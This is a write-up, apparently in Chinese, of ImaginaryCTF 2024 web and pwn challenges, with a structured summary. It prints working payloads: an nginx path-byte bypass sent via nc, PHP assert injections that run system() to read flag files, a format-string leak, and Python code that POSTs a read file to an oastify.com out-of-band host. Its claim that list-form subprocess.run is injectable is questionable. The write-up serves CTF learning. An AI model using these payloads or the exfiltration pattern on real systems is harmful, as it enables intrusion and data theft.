---
title: ImaginaryCTF 2024 WriteUp (狼组) Web + Pwn
contest: ImaginaryCTF
year: 2024
difficulty: easy
vuln_type: web_unknown
tags: [nginx 路径规范化, Python 代码注入, PHP assert 注入, maze 条件竞争, fmt-string]
attack_chain: |
  1. Readme: nginx 1.22.1 if (-f $request_filename) return 404 + proxy_pass → 0xA0 0x0A 字节绕过 -f
  2. P2C: Python 2 Color picker → Python 代码注入 → cat flag.txt | base64 → 外带 oastify
     - import subprocess.run + urllib oastify
  3. Crystals: Al₂O₃ → 特殊字符触发 Hostname 报错 → flag 在 Hostname
     - GET /asdsad>!@#@!$%@$^# HTTP/1.1 + Host: crystals.chal.imaginaryctf.org
  4. Journal: PHP assert 字符串注入 → file1.txt' and die(system("cat /flag-cARdaInFg6dD10uWQQgm.txt")) or '
  5. The Amazing Race: 数据库 maze 条件竞争 → select 和 update 多线程错位
     - ictf{turns_out_all_you_need_for_quantum_tunneling_is_to_be_f@st}
  6. Pwn imgstore: 朴实无华 fmt-string → %17$p %18$p %19$p %25$p 一次性读 canary/buf/pie/libc → ret2libc
key_payload: |
  # Readme nginx 0xA0 0x0A:
  GET /flag.txt\xA0\x0aHTTP/1.1
  # => ictf{path_normalization_to_the_res
  
  # P2C subprocess 注入:
  import subprocess
  subprocess.run(['cat', 'flag.txt'])  # 第二参数若用户可控可注入
  
  # Journal assert 注入:
  /?file=file1.txt'%20and%20die(system("cat%20/flag-cARdaInFg6dD10uWQQgm.txt"))%20or%20'
  
  # Amazing Race maze 条件竞争:
  # 同一空位疯狂冲撞
  
  # imgstore fmt-string:
  %17$p%18$p%19$p%25$p  # canary/buf/pie/libc
one_liner: ImaginaryCTF 2024 狼组搬运版 WriteUp，5 道 Web (Readme/P2C/Crystals/Journal/Amazing Race) + 1 道 Pwn (imgstore fmt)。
lesson: |
  - ImaginaryCTF 历来偏友好 (直接给源码 + 简单绕过)
  - nginx 路径规范化 (0xA0 0x0A 字节) 是经典 LFI/web 题
  - PHP assert 字符串拼接 = RCE 是入门套路
  - Python subprocess.run 第二参数若 list 用户可控可注入
  - 数据库 maze 题条件竞争 (select/update 跨线程) 经常出
  - fmt-string 一次性读多寄存器 (canary/buf/pie/libc) 是入门 Pwn 模板
quality: low
---

# ImaginaryCTF 2024 WriteUp (狼组)

> 来源: ctfiot.com 195241 - 狼组安全社区

## WEB

### Readme

nginx 1.22.1 路径规范化绕过。`if (-f $request_filename) return 404` 配合 `proxy_pass` 可用 `0xA0 0x0A` 字节差异绕过。

```bash
echo -e "GET /flag.txt\xA0\x0aHTTP/1.1" | nc readme.chal.imaginaryctf.org 80
# ictf{path_normalization_to_the_res
```

### P2C (Python 2 Color)

```python
import urllib.request
import subprocess
import urllib.parse

def fetch_data():
    result = subprocess.run(['cat', 'flag.txt'], capture_output=True, text=True)
    flag = result.stdout.strip()
    data = urllib.parse.urlencode({'flag': flag}).encode()
    url = "http://sd96d2ywsngcglfawln1iefbn2ttho5d.oastify.com/"
    req = urllib.request.Request(url, data=data)
    response = urllib.request.urlopen(req)
    return response.read().decode('utf-8')
```

`subprocess.run` 第二参数用户可控 → 注入新命令 → 外带 flag。

### Crystals (Hostname 报错)

```http
GET /asdsad>!@#@!$%@$^# HTTP/1.1
Host: crystals.chal.imaginaryctf.org
```

报错信息里直接含 flag。

### Journal (PHP assert 注入)

```php
assert("strpos('$file', '..') === false") or die("Invalid file!");
```

`$file` 注入：

```
file1.txt' and die(system('ls /')) or '
file1.txt' and die(system("cat /flag-cARdaInFg6dD10uWQQgm.txt")) or '
```

### The Amazing Race (maze 条件竞争)

数据库 maze 题。`select` 判断方向能否移动 + `update` 坐标更新 是不同线程 → 疯狂冲撞同一空位 → 走出边界。

`ictf{turns_out_all_you_need_for_quantum_tunneling_is_to_be_f@st}`

## Pwn

### imgstore (fmt-string)

```python
io.sendline(b"3")  # 进入 fmt 模式
p = b"%17$p%18$p%19$p%25$p"
io.sendline(p)
# canary / buf / pie / __libc_start_main 一次读出
```

ret2libc 模板收尾。

## 评价

狼组搬运的 ImaginaryCTF 2024 WriteUp，5 道 Web + 1 道 Pwn，题题都是"工具熟悉度"考试。每题都是公开技巧的复习，没有新洞或新思路，但作为 web/pwn 入门 cheat sheet 价值中等。
